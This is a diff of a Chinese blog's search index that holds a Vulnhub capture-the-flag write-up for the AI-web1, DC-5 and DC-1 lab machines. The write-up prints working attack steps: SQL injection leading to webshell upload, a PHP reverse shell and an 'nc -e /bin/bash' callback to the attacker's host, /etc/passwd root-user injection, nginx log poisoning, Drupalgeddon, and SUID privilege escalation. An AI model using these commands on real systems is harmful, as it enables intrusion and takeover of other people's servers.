+<pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> --data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php</code></pre>
+
+<p>上传成功后使用工具连接即可</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930000537720.png" alt="image-20220930000537720"></p>
+<p>此时已经获取到了网站的控制权，但是权限依然很低，因此需要进行提权</p>
+<p>为了操作方便，需要先反弹shell</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>首先在kali中监听4444端口</p>
+<pre><code class="hljs sh">nv -lvvp 4444</code></pre>
+
+<p>然后在网站中上传一个php文件</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;192.168.152.130&quot;</span>,<span class="hljs-number">4444</span>);
+exec(<span class="hljs-string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>上传成功后，执行该文件</p>
+<pre><code class="hljs sh">php web.php</code></pre>
+
+<p>即可获取shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先在kali中使用openssl创建一个用户</p>
+<pre><code class="hljs sh">openssl passwd -1 -salt hacker 123456</code></pre>
+
+<p>将该用户加入到root组中，既可拥有root权限(在反弹的shell中执行该命令)</p>
+<pre><code class="hljs sh">hacker:$1$hacker<span class="hljs-variable">$6luIRwdGpBvXdP</span>.GMwcZp/:0:0::/root:/bin/bash</code></pre>
+
+<p>将该用户的信息写入到<code>/etc/passwd</code>中，就想当于在靶机中创建了一个root用户权限的用户</p>
+<pre><code class="hljs sh">ehco <span class="hljs-string">&#x27;sun:$1$sun$DD5cShz08xZBESgMJhDRY.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</code></pre>
+
+<p>切换用户</p>
+<pre><code class="hljs sh">su hacker</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930002110117.png" alt="image-20220930002110117"></p>
+<h2 id="读取flag"><a href="#读取flag" class="headerlink" title="读取flag"></a>读取flag</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929122622040.png" alt="image-20220929122622040"></p>
+<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>运行虚拟机后，将kali与靶机配置到同一网卡下即可</p>
+<p>kali的ip地址：<code>192.168.56.101</code></p>
+<h2 id="网络嗅探-1"><a href="#网络嗅探-1" class="headerlink" title="网络嗅探"></a>网络嗅探</h2><p>在kali中使用netdiscover发现当前网络中存活的主机</p>
+<pre><code class="hljs sh">netdiscover -i eth0</code></pre>
+
+<p>探测到靶机的ip地址为：<code>192.168.56.102</code></p>
+<p>再使用nmap扫描开放的服务端口</p>
+<pre><code class="hljs sh">nmap -sS -sV -A -n 192.168.56.102</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930163714244.png" alt="image-20220930163714244"></p>
+<p>可以看到靶机的80端口是开启的，直接访问。</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>网页中存在一个留言板<code>http://192.168.220.139/contact.php</code></p>
+<p>提交留言信息会跳转到<code>http://192.168.56.102/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=1</code></p>
+<p>此时再次刷新页面，会发现右下角的copyright会发生变化</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930164227501.png" alt="image-20220930164227501"></p>
+<p>首先使用dirb 去探测网站中的所有url，但是效果不好只能探测到index.php</p>
+<p>那么就用bp的intruder模块加载自己的字典进行路劲爆破，最后爆破结果如下</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930172927445.png" alt="image-20220930172927445"></p>
+<p>这里的footer是网页源码中没有暴露的页面。</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930173042421.png" alt="image-20220930173042421"></p>
+<p>由于footer.php的内容可以显示子再thankyou.php中，那么thankyou.php一定是包含了footer.php，那么下面的要找出thankyou.php包含文件的参数是什么</p>
+<p>尝试</p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span>/thankyou.php?page=footer.php
+http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span>/thankyou.php?file=footer.php</code></pre>
+
+<p>发现以上两个参数都可以正常访问</p>
+<p>接下来就是尝试文件包含漏洞</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>上面已经发现页面存在文件包含，很直观的想法就是看能否将<code>/etc/passwd</code>读取到</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930232717029.png" alt="image-20220930232717029"></p>
+<pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span> <span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin <span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span> systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Time Synchronization,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span> systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:systemd</span> Bus Proxy,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> Debian-<span class="hljs-symbol">exim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/exim4</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/dbus</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">statd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/nfs</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">dc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:dc</span>,,,<span class="hljs-symbol">:/home/dc</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span></code></pre>
+
+
+
+<p>从http的响应头可以看到网站使用的中间件是nginx，那么可尝试获取去nginx的日志文件，默认绝对路径为<code>/var/log/nginx/access.log</code></p>
+<p>使用url<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001160016500.png" alt="image-20221001160016500"></p>
+<p>这里一定得要用bp，不然会由于浏览器的自动编码导致失效</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001105755300.png" alt="image-20221001105755300"></p>
+<p>能够发现刚才的访问记录已经被写入到了日志文件中</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930234744268.png" alt="image-20220930234744268"></p>
+<p><strong>PHP中造成文件包含的四个函数</strong></p>
+<blockquote>
+<p><strong>1、include() 、require()</strong></p>
+<p><strong>当使用include()函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</strong></p>
+<p><strong>当使用require()函数包含文件时，只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息，并且终止脚本的运行</strong></p>
+<p><strong>2、include_once() 功能和 include() 相同，区别在于当重复调用同一文件时，程序只调用一次。</strong></p>
+<p><strong>require_once()功能和require()相同，区别在于当重复调用同一文件时，程序只调用一次。</strong></p>
+<p>​       <strong>当使用上述四个函数包含一个新文件时，该文件将作为 PHP 代码执行，php 内核并不在意该被包含的文件是什么类型。所以如果被包含的是 txt 文件、图片文件、远程 url、也都将作为 PHP 代码执行。</strong></p>
+</blockquote>
+<p>一句话木马上传成功后，就可以使用蚁剑连接了</p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span><span class="hljs-regexp">/thankyou.php?file=/</span>var<span class="hljs-regexp">/log/</span>nginx/access.log
+密码：<span class="hljs-number">666</span></code></pre>
+
+<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>再kali中监听4444端口</p>
+<pre><code class="hljs sh">nc -lvvp 4444</code></pre>
+
+<p>再蚁剑的终端中执行</p>
+<pre><code class="hljs sh">nc  -e  /bin/bash  192.168.56.101 4444</code></pre>
+
+<p>此时已经获取shell</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113341268.png" alt="image-20221001113341268"></p>
+<p>使用python的反弹shell</p>
+<pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></code></pre>
+
+<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>使用find命令，查找具有suid权限的命令，发现screen-4.5.0</p>
+<pre><code class="hljs sh">find / -perm /4000 2 &gt; /dev/null</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113542405.png" alt="image-20221001113542405"></p>
+<p>那么就可以查找可用于screen 4.5.0的漏洞脚本文件，再kali中查找</p>
+<pre><code class="hljs sh">searchsploit screen 4.5.0</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001113845331.png" alt="image-20221001113845331"></p>
+<p>将脚本拷贝到当前工作目录</p>
+<pre><code class="hljs sh">cp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/41154.sh  41154.sh
+
+cp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/41152.txt  41152.txt</code></pre>
+
+<p>尝试从蚁剑上传到网站的根目录，但是发现权限不够，最后再/tmp目录上传成功</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120350730.png" alt="image-20221001120350730"></p>
+<p>加上可执行权限即可</p>
+<pre><code class="hljs sh">chmod +x 41154.sh</code></pre>
+
+<p>在kali中的shell执行</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120551421.png" alt="image-20221001120551421"></p>
+<h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><p>进入root目录即可获取到flag</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221001120217058.png" alt="image-20221001120217058"></p>
+<h1 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>将靶机与kali放在同一网卡下实现相互通信即可</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用</p>
+<pre><code class="hljs sh">arp-scan -l
+netdiscover -eth0</code></pre>
+
+<p>发现目标靶机的ip地址为<code>192.168.56.103</code></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005124337784.png" alt="image-20221005124337784"></p>
+<p>直接方位该ip地址，发现是可访问的网站，但是需要密码无法进入</p>
+<p>但是很明显可以看出此网站使用的CMS为Drupal,那么就寻找与该CMS存在的漏洞即可</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005125020123.png" alt="image-20221005125020123"></p>
+<p>可以看到关于drupal 的漏洞有七个，但是我们需要选择最新的且等级为excellent的</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里使用的是<code>exploit/multi/http/drupal_drupageddon</code></p>
+<pre><code class="hljs sh">use exploit/multi/http/drupal_drupageddon
+<span class="hljs-built_in">set</span> RHOSTS 192.168.56.103
+<span class="hljs-built_in">set</span> LHOST 192.168.56.101
+run</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005130958089.png" alt="image-20221005130958089"></p>
+<p>网站的根目录中存在一个flag1.txt，其中提示</p>
+<pre><code class="hljs gradle"><span class="hljs-keyword">Every</span> good CMS needs a config <span class="hljs-keyword">file</span> - and so <span class="hljs-keyword">do</span> you.</code></pre>
+
+<p>那么就是找cms的配置文件，而drupal的默认配置文件位置 <code>/var/www/sites/default/settings.php</code></p>
+<p>查看此配置文件，可以看到mysql数据库的账号密码</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005131437953.png" alt="image-20221005131437953"></p>
+<p>并且出现了flag2</p>
+<blockquote>
+<p>翻译:蛮力和字典攻击不行，唯一方法是获得访问权限(你将需要访问的)。你能用这些凭证做什么?</p>
+</blockquote>
+<h2 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h2><p>在msfconsole中获取shell后使用执行下面这句话</p>
+<pre><code class="hljs sh">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>
+连接数据库
+
+mysql -udbuser -p</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005133337362.png" alt="image-20221005133337362"></p>
+<p>密码是加密后保存到数据库的。但是在<code>/var/www/script</code>中发现了将密码转换为hash的脚本，可以使用脚本生成自己的密码的hash然后保存到数据库中，可惜的是该标本的环境存在问题，无法运行</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005134059498.png" alt="image-20221005134059498"></p>
+<p>百度以下<code>drupal 密码</code>相关的问题，发现有重置admin密码的方法</p>
+<blockquote>
+<p>password的SHA-512加密运算的结果“$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4”；</p>
+</blockquote>
+<p>那么就是在数据库中更新admin的密码即可</p>
+<pre><code class="hljs mysql">update users set pass &#x3D; &#39;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50&#x2F;kb81YI9.8M&#x2F;D9okW7J&#x2F;s5U4&#39; where name &#x3D; &#39;admin&#39;;</code></pre>
+
+<p>登录后在网站中发现了flag3</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005135247304.png" alt="image-20221005135247304"></p>
+<blockquote>
+<p>特殊的PERMS将帮助查找passwd -但您需要-exec该命令来找出如何获取阴影中的内容。</p>
+</blockquote>
+<p>在<code>home/flag4</code>中看到flag4</p>
+<blockquote>
+<p>Can you use this same method to find or access the flag in root?</p>
+<p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
+<p>您可以使用相同的方法在根目录中查找或访问标志吗?</p>
+<p>可能。但也许并没有那么容易。也许是这样?</p>
+</blockquote>
+<p><strong>使用CVE2014-3704添加管理账号</strong></p>
+<p>在exploit-db中有可以直接利用的EXP，可以直接添加管理账号<br>地址：<a href="https://www.exploit-db.com/exploits/34992">https://www.exploit-db.com/exploits/34992</a></p>
+<p>在kali中开启web服务，然后再靶机中下载该exp</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005142802768.png" alt="image-20221005142802768"></p>
+<pre><code class="hljs awk">靶机端下载
+wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.101</span>/<span class="hljs-number">34992</span>.py
+靶机端运行
+python <span class="hljs-number">34992</span>.py -t http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.103</span>/ -u hack -p root</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005143232685.png" alt="image-20221005143232685"></p>
+<p>直接使用hack 登录</p>
+<h2 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h2><p>使用find找下具有root权限的suid</p>
+<pre><code class="hljs sh">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
+find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null  <span class="hljs-comment"># 这句也可以</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005135623191.png" alt="image-20221005135623191"></p>
+<p>可以发现find命令可以用来提权</p>
+<p>尝试使用find执行命令</p>
+<pre><code class="hljs sh">find / -name flag4 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;whoami&quot;</span> \; <span class="hljs-comment"># 注意这里的-name 后的参数需要是存在的文件</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005141313251.png" alt="image-20221005141313251"></p>
+<p>这里执行的结果可以看出find是可以提权的</p>
+<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>直接使用执行 <code>/bin/sh</code></p>
+<pre><code class="hljs sh">find / -name flag4 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005141539383.png" alt="image-20221005141539383"></p>
+]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vue_component</title>
     <url>/2022/05/26/vue-component/</url>
     <content><![CDATA[<h1 id="Vue组件"><a href="#Vue组件" class="headerlink" title="Vue组件"></a>Vue组件</h1><p>做项目中使用到的vue组件，记录一下，以后使用到时直接复制即可</p>
@@ -3200,618 +3812,6 @@ export default &#123;
 <h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2>]]></content>
       <tags>
         <tag>vue</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vulnhub</title>
-    <url>/2022/09/30/vulnhub/</url>
-    <content><![CDATA[<h1 id="AI-web1"><a href="#AI-web1" class="headerlink" title="AI-web1"></a>AI-web1</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>只要使靶机与kali处于同一网段即可</p>
-<h2 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="网络嗅探"></a>网络嗅探</h2><p>在kali中使用</p>
-<pre><code class="hljs sh">netdiscover  <span class="hljs-comment"># 可以探测出与kali处于同一网段中存活的主机</span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929233618239.png" alt="image-20220929233618239"></p>
-<p>由图中的信息可以看到靶机的ip地址为<code>192.168.152.133</code></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>使用nmap扫描指定的ip</p>
-<pre><code class="hljs sh">nmap -sS -sV -A -n 192.168.152.133</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929233830903.png" alt="image-20220929233830903"></p>
-<p>扫描结果显示靶机的80端口开放，并且探测到url，使用的中间件为apache</p>
-<p>访问  <code>m3diNf0/</code>和<code>/se3reTdir777/uploads/</code>，没有有用信息，继续扫描路径</p>
-<pre><code class="hljs sh">dirb http://192.168.152.133/m3diNf0/
-dirb http://192.168.152.133/se3reTdir777/uploads/
-dirb http://192.168.152.133/se3reTdir777/</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234638450.png" alt="image-20220929234638450"></p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234645788.png" alt="image-20220929234645788"></p>
-<p>扫描两个可访问的的url，在浏览器中打开，info.php中是phpinfo的信息，其中有一个信息很有用就是，网站的根目录</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234927206.png" alt="image-20220929234927206"></p>
-<p>而<code>http://192.168.152.133/se3reTdir777/index.php</code>，是一个用户查询的接口，很明显像是sql注入，直接用sqlmap扫</p>
-<pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span>
-sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --dbs
-sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 --tables
-sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T user -columns</code></pre>
-
-<p>最后获得结果并没有什么用，但是可以尝试使用sqlmap获取shell权限</p>
-<pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --level=3 --os-shell</code></pre>
-
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929235903463.png" alt="image-20220929235903463"></p>
-<p>能够获取shell权限，但是权限很低，只是www-data</p>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>前文我们已经知道网站绝对路径，其实就就是可以尝试sqlmap的文件上传</p>
-<p>将一句话木马上传到网站的根目录中</p>
-<pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> --data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php</code></pre>
-
-<p>上传成功后使用工具连接即可</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220930000537720.png" alt="image-20220930000537720"></p>
-<p>此时已经获取到了网站的控制权，但是权限依然很低，因此需要进行提权</p>
-<p>为了操作方便，需要先反弹shell</p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>首先在kali中监听4444端口</p>
-<pre><code class="hljs sh">nv -lvvp 4444</code></pre>
-
-<p>然后在网站中上传一个php文件</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;192.168.152.130&quot;</span>,<span class="hljs-number">4444</span>);
-exec(<span class="hljs-string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);
-<span class="hljs-meta">?&gt;</span></code></pre>
-
-<p>上传成功后，执行该文件</p>
-<pre><code class="hljs sh">php web.php</code></pre>
-
-<p>即可获取shell</p>
